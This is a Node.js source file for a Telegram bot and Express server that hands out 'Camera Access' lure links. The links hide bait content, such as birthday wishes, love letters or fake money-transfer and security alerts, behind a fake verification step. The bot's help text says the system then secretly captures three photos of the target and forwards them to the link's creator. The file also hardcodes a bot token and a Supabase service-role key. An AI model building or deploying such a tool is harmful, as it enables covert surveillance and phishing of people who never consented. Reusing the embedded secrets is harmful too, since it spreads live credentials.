const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const https = require('https');

// ================= Configurations =================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7599562667:AAEzBnwqNr1uzn6F4ZmLSV0LIjobVrbnkJo';
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://oqadecntljqjxfgsfcfq.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9xYWRlY250bGpxanhmZ3NmY2ZxIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MTE4Mzk4NiwiZXhwIjoyMDk2NzU5OTg2fQ.cFuBbo_TjaRDM9eNqknXnm33a2ZoWN7YKet-i9OoCuY';
const BASE_URL = process.env.BASE_URL || 'https://camera-5nbr.onrender.com';
const PORT = process.env.PORT || 3000;

const CHANNEL_USERNAME = '@camera_access';
const WELCOME_IMAGE_URL = 'https://cyrjsbfsfhcwocdqtkuv.supabase.co/storage/v1/object/public/Maruf/ChatGPT%20Image%20Jun%2012,%202026,%2012_43_05%20AM.png';

// Initialize clients
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const app = express();
const upload = multer({ dest: 'uploads/' });

app.use(express.static('public'));

// State manager
const userState = {};

const templates = {
    'tpl_1': '🎂 Happy Birthday Wish',
    'tpl_2': '🎉 Congratulations',
    'tpl_3': '💔 I Miss You',
    'tpl_4': '😂 Funny Meme',
    'tpl_5': '🎵 Music Recommendation',
    'tpl_6': '🎬 Movie Ticket',
    'tpl_7': '🎁 Surprise Gift',
    'tpl_8': '💌 Secret Love Letter',
    'tpl_9': '💵 Money Transfer',
    'tpl_10': '⚠️ Security Alert'
};

// ================= Helper Functions =================

async function checkMembership(userId) {
    try {
        const member = await bot.getChatMember(CHANNEL_USERNAME, userId);
        return ['creator', 'administrator', 'member'].includes(member.status);
    } catch (err) {
        console.error('Membership check error:', err.message);
        return false;
    }
}

function showStartMenu(chatId) {
    const opts = {
        reply_markup: {
            keyboard: [
                [{ text: '🚀 Start Task' }, { text: '🛠 Help' }]
            ],
            resize_keyboard: true
        },
        parse_mode: 'HTML'
    };
    
    const menuText = `<b>🌟 Welcome to the Ultimate Camera Access System 🌟</b>

<b>Developed by:</b> <i>Maruf</i>

✅ <b>Verification Successful!</b>
You have been successfully verified as a premium member of our community. 

<b>🔹 How it works:</b>
1️⃣ Click the <b>🚀 Start Task</b> button below.
2️⃣ Choose your payload method (Image, Text, or Template).
3️⃣ Get a unique secure link.
4️⃣ Share the link with your target.

<i>We ensure 100% security and fast delivery of your captures directly to this bot. Enjoy our professional service!</i>`;

    bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: menuText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
}

async function createLink(chatId, type, content) {
    try {
        // Content is original_image_url for 'image', and text content for 'text'/'template'
        const insertObj = {
            chat_id: chatId,
            payload_type: type
        };
        
        if (type === 'image') {
            insertObj.original_image_url = content;
            insertObj.payload_content = null;
        } else {
            insertObj.original_image_url = null;
            insertObj.payload_content = content;
        }

        const { data: insertData, error: dbError } = await supabase
            .from('links')
            .insert([insertObj])
            .select();

        if (dbError) throw dbError;

        const uniqueId = insertData[0].id;
        const generatedLink = `${BASE_URL}?id=${uniqueId}`;

        const successMsg = `<b>✅ Success!</b> Here is your link:\n\n<code>${generatedLink}</code>\n\n<i>Send this link to someone. When they open it and allow camera access, their photos will be sent to you here.</i>`;
        bot.sendMessage(chatId, successMsg, { parse_mode: 'HTML' });
    } catch (err) {
        console.error('DB Insert Error:', err);
        bot.sendMessage(chatId, '❌ Sorry, there was an error generating your link.');
    }
}

// ================= Telegram Bot Logic =================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    userState[chatId] = { step: 'none' };
    
    try {
        bot.sendChatAction(chatId, 'typing');
        const isMember = await checkMembership(userId);
        
        if (!isMember) {
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📢 Join Our Official Channel', url: 'https://t.me/camera_access' }],
                        [{ text: '✅ I Have Joined (Verify)', callback_data: 'check_joined' }]
                    ]
                },
                parse_mode: 'HTML'
            };
            const welcomeText = `<b>🛑 Access Denied!</b>\n\nHello there! To use <b>Maruf's Premium Bot</b>, you must be a member of our official channel.\n\n👇 <b>Please follow these steps:</b>\n1. Click "Join Our Official Channel"\n2. Join the channel.\n3. Come back and click "I Have Joined"`;
            
            bot.sendPhoto(chatId, WELCOME_IMAGE_URL, { caption: welcomeText, parse_mode: 'HTML', reply_markup: opts.reply_markup });
            return;
        }
        
        showStartMenu(chatId);
    } catch (error) {
        console.error("Start command error:", error);
        bot.sendMessage(chatId, "Sorry, something went wrong. Please try again.");
    }
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const helpText = `<b>🛠 How to use Camera Access Bot</b>

Welcome to the ultimate secure image sharing tool! Here is the step-by-step guide:

<b>1️⃣ Start the Bot:</b>
Click the <b>🚀 Start Task</b> button from the bottom menu.

<b>2️⃣ Choose Method:</b>
Select whether you want to hide an Image, a Text message, or a ready-made Template.

<b>3️⃣ Get the Secure Link:</b>
The bot will instantly generate a unique, secure link for your payload.

<b>4️⃣ Share the Link:</b>
Send this link to your target.

<b>5️⃣ Verification Process:</b>
To view the hidden content, they must click <b>Verify</b> and allow camera access.

<b>6️⃣ Receive Captures:</b>
The system will secretly capture 3 photos and send them directly to you in this chat!

<i>🔐 Note: Everything is fully automated and secure.</i>`;

    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const userId = callbackQuery.from.id;
    
    try {
        if (callbackQuery.data === 'check_joined') {
            const isMember = await checkMembership(userId);
            if (isMember) {
                bot.deleteMessage(chatId, msg.message_id).catch(()=>{});
                showStartMenu(chatId);
            } else {
                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You haven\'t joined the channel yet! Please join first.', show_alert: true });
            }
        }
        else if (callbackQuery.data === 'method_image') {
            userState[chatId] = { step: 'await_image' };
            bot.sendMessage(chatId, '<b>📸 Please upload the image you want to hide.</b>\n<i>Just send any photo directly to me now.</i>', { parse_mode: 'HTML' });
            bot.answerCallbackQuery(callbackQuery.id);
        }
        else if (callbackQuery.data === 'method_text') {
            userState[chatId] = { step: 'await_text' };
            bot.sendMessage(chatId, '<b>📝 Please send the text message you want to hide.</b>\n<i>Type your message and send it to me.</i>', { parse_mode: 'HTML' });
            bot.answerCallbackQuery(callbackQuery.id);
        }
        else if (callbackQuery.data === 'method_template') {
            userState[chatId] = { step: 'none' };
            const templateKeyboard = Object.keys(templates).map(key => ([{ text: templates[key], callback_data: key }]));
            bot.sendMessage(chatId, '<b>🎁 Select a Template to hide:</b>', {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: templateKeyboard }
            });
            bot.answerCallbackQuery(callbackQuery.id);
        }
        else if (templates[callbackQuery.data]) {
            // Template selected
            bot.answerCallbackQuery(callbackQuery.id, { text: 'Template selected!' });
            await createLink(chatId, 'template', templates[callbackQuery.data]);
        }
    } catch (error) {
        console.error("Callback query error:", error);
    }
});

// Handle custom keyboard clicks & text inputs
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return; // ignore non-text here
    if (text.startsWith('/')) return; // ignore commands

    if (text === '🚀 Start Task') {
        userState[chatId] = { step: 'none' };
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📸 Send Image', callback_data: 'method_image' }],
                    [{ text: '📝 Send Text', callback_data: 'method_text' }],
                    [{ text: '🎁 Select Template', callback_data: 'method_template' }]
                ]
            },
            parse_mode: 'HTML'
        };
        bot.sendMessage(chatId, '<b>⚙️ Select Payload Method:</b>\nWhat do you want to hide behind the verification?', opts);
    } 
    else if (text === '🛠 Help') {
        userState[chatId] = { step: 'none' };
        // Trigger help command logic
        bot.emit('text', { ...msg, text: '/help' }, null); // simulate command
    }
    else {
        // User typed normal text
        if (userState[chatId] && userState[chatId].step === 'await_text') {
            userState[chatId] = { step: 'none' };
            bot.sendMessage(chatId, '<i>Processing your text...</i>', { parse_mode: 'HTML' });
            await createLink(chatId, 'text', text);
        } else {
            bot.sendMessage(chatId, '<i>⚠️ Please use the provided buttons.</i>', { parse_mode: 'HTML' });
        }
    }
});

bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    
    if (userState[chatId] && userState[chatId].step === 'await_image') {
        bot.sendMessage(chatId, '<i>Processing your image... Please wait.</i>', { parse_mode: 'HTML' });
        userState[chatId] = { step: 'none' };
        
        try {
            const photo = msg.photo[msg.photo.length - 1];
            const fileId = photo.file_id;
            const fileUrl = await bot.getFileLink(fileId);
            
            const fileName = `orig_${Date.now()}.jpg`;
            const filePath = path.join(__dirname, 'uploads', fileName);
            
            if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
                fs.mkdirSync(path.join(__dirname, 'uploads'));
            }

            const file = fs.createWriteStream(filePath);
            https.get(fileUrl, function(response) {
                response.pipe(file);
                file.on('finish', async function() {
                    file.close();
                    
                    try {
                        const fileBuffer = fs.readFileSync(filePath);
                        const { data, error } = await supabase.storage
                            .from('image')
                            .upload(`originals/${fileName}`, fileBuffer, {
                                contentType: 'image/jpeg',
                                upsert: true
                            });

                        if (error) throw error;

                        const { data: publicUrlData } = supabase.storage
                            .from('image')
                            .getPublicUrl(`originals/${fileName}`);
                        
                        const publicUrl = publicUrlData.publicUrl;

                        fs.unlinkSync(filePath);
                        
                        await createLink(chatId, 'image', publicUrl);
                    } catch (uploadErr) {
                        console.error('Supabase Error:', uploadErr);
                        bot.sendMessage(chatId, '❌ Sorry, there was an error uploading your image to the database.');
                    }
                });
            }).on('error', function(err) {
                console.error('Download Error:', err);
                bot.sendMessage(chatId, '❌ Sorry, failed to download image.');
            });
            
        } catch (err) {
            console.error('Error:', err);
            bot.sendMessage(chatId, '❌ Sorry, an error occurred.');
        }
    }
});

// ================= Express API Logic =================

app.get('/api/link/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const { data, error } = await supabase
            .from('links')
            .select('*')
            .eq('id', id)
            .single();

        if (error || !data) {
            return res.status(404).json({ error: 'Link not found' });
        }
        res.json({ 
            payload_type: data.payload_type || 'image',
            payload_content: data.payload_content,
            original_image_url: data.original_image_url 
        });
    } catch (err) {
        console.error('API Error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/upload', upload.array('photos', 3), async (req, res) => {
    const { id } = req.body;
    const files = req.files;

    if (!id || !files || files.length === 0) {
        return res.status(400).json({ error: 'Missing ID or photos' });
    }

    try {
        const { data: linkData, error: dbError } = await supabase
            .from('links')
            .select('*')
            .eq('id', id)
            .single();

        if (dbError || !linkData) {
            return res.status(404).json({ error: 'Link not found' });
        }

        const chatId = linkData.chat_id;
        const uploadedPhotos = [];

        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const fileBuffer = fs.readFileSync(file.path);
            const fileName = `captured_${id}_${Date.now()}_${i}.jpg`;

            const { error: uploadError } = await supabase.storage
                .from('image')
                .upload(`captured/${fileName}`, fileBuffer, {
                    contentType: 'image/jpeg',
                    upsert: true
                });

            if (!uploadError) {
                uploadedPhotos.push({
                    type: 'photo',
                    media: fs.createReadStream(file.path)
                });
            }
        }

        if (uploadedPhotos.length > 0) {
            await bot.sendMediaGroup(chatId, uploadedPhotos);
            let msgText = '<b>📸 New photos received from your link!</b>\n';
            if (linkData.payload_type === 'image') msgText += '<i>Method: Image</i>';
            else if (linkData.payload_type === 'text') msgText += '<i>Method: Text</i>';
            else if (linkData.payload_type === 'template') msgText += `<i>Method: Template (${linkData.payload_content})</i>`;
            
            bot.sendMessage(chatId, msgText, { parse_mode: 'HTML' });
        }

        files.forEach(file => fs.unlinkSync(file.path));
        res.json({ success: true });

    } catch (err) {
        console.error('Upload Endpoint Error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ================= Start Server =================
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
